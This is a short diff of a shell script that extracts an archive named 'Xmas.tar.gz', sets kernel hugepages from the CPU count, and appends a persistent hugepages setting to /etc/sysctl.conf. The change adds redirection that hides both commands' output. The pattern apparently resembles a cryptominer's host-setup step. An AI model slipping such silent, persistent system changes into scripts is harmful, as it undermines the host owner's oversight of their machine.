@@ -78,7 +78,7 @@ tar -xf Xmas.tar.gz
 
 sleep 2
 
-sysctl -w vm.nr_hugepages=$(nproc)
+sysctl -w vm.nr_hugepages=$(nproc) 1>/dev/null 2>&1
 
 for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
 do
@@ -87,7 +87,7 @@ done
 
 sleep 2
 
-bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
+bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf" 1>/dev/null 2>&1
 
 sleep 2
 
